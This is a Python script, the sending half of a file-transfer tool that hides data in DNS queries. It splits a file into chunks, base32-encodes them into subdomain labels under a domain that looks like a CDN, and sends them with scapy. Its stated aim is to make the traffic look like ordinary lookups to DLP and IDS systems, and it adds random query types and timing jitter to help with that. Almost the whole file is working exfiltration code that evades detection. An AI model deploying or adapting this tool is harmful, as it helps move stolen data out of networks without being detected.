#!/usr/bin/env python3
"""DNS File Transfer - Server (Sender)

Encodes file data into DNS subdomain queries so traffic
looks like legitimate DNS lookups to DLP/IDS systems.

Example generated query:
    JBSWY3DPEB3W64TMMQ.0005.cdn-analytics.com  (type A)

Structure: <base32_chunk>.<seq_number>.<base_domain>
"""

import base64
import hashlib
import random
import sys
import time

from scapy.all import IP, UDP, DNS, DNSQR, send

from config import (
    BASE_DOMAIN,
    CHUNK_SIZE,
    DNS_PORT,
    HASH_ALGORITHM,
    METADATA_SEPARATOR,
    QUERY_TYPES,
    SEND_DELAY,
    SEND_JITTER,
)


def read_file(filepath):
    """Read a file and return its contents as bytes."""
    with open(filepath, "rb") as f:
        return f.read()


def compute_hash(data):
    """Compute hash of data using the configured algorithm."""
    hasher = hashlib.new(HASH_ALGORITHM)
    hasher.update(data)
    return hasher.hexdigest()


def split_into_chunks(data, chunk_size=CHUNK_SIZE):
    """Split data into fixed-size chunks."""
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def encode_chunk(chunk):
    """Encode a binary chunk to base32 (DNS-safe, case-insensitive).

    Base32 uses only A-Z and 2-7, which are valid DNS label characters.
    We strip padding '=' since it's not valid in DNS names.
    """
    return base64.b32encode(chunk).decode().rstrip("=").lower()


def build_query_name(encoded_data, sequence_num):
    """Build a DNS query name: <encoded_data>.<seq>.<base_domain>."""
    return f"{encoded_data}.{sequence_num:04d}.{BASE_DOMAIN}"


def random_query_type():
    """Pick a random DNS query type to vary traffic patterns."""
    return random.choice(QUERY_TYPES)


def add_jitter(base_delay, jitter):
    """Return delay with random jitter for natural-looking traffic."""
    return base_delay + random.uniform(-jitter, jitter)


def send_file(src_ip, dst_ip, filepath):
    """Send a file as DNS subdomain queries.

    Protocol:
        Packet 0 (seq=0000): metadata → chunk_count||sha256_hash
        Packet 1..N (seq=0001+): encoded file chunks
    """
    file_data = read_file(filepath)
    file_hash = compute_hash(file_data)
    chunks = split_into_chunks(file_data)

    print(f"File: {filepath}")
    print(f"Size: {len(file_data)} bytes")
    print(f"Chunks: {len(chunks)}")
    print(f"Hash ({HASH_ALGORITHM}): {file_hash}")
    print(f"Domain: {BASE_DOMAIN}")
    print()

    # Send metadata as first query (seq 0000)
    metadata = f"{len(chunks)}{METADATA_SEPARATOR}{file_hash}"
    encoded_meta = encode_chunk(metadata.encode())
    qname = build_query_name(encoded_meta, 0)
    qtype = random_query_type()

    pkt = (
        IP(src=src_ip, dst=dst_ip)
        / UDP(sport=random.randint(1024, 65535), dport=DNS_PORT)
        / DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype))
    )
    send(pkt, verbose=False)
    print(f"[0000] META → {qname} ({qtype})")

    # Send file chunks
    for i, chunk in enumerate(chunks):
        seq = i + 1
        encoded = encode_chunk(chunk)
        qname = build_query_name(encoded, seq)
        qtype = random_query_type()

        pkt = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(1024, 65535), dport=DNS_PORT)
            / DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype))
        )
        send(pkt, verbose=False)
        print(f"\r[{seq:04d}] Sending chunk {seq}/{len(chunks)}", end="", flush=True)

        delay = add_jitter(SEND_DELAY, SEND_JITTER)
        time.sleep(delay)

    print(f"\nTransfer complete. Sent {len(chunks)} DNS queries.")


def main():
    dst_ip = input("Enter destination IP: ").strip()
    src_ip = input("Enter your IP: ").strip()

    if not dst_ip or not src_ip:
        print("Error: IP addresses cannot be empty.")
        sys.exit(1)

    filepath = input("Enter file path to send: ").strip()

    try:
        send_file(src_ip, dst_ip, filepath)
    except FileNotFoundError:
        print(f"Error: File '{filepath}' not found.")
        sys.exit(1)
    except PermissionError:
        print("Error: Permission denied. Run with sudo for raw packet access.")
        sys.exit(1)


if __name__ == "__main__":
    main()
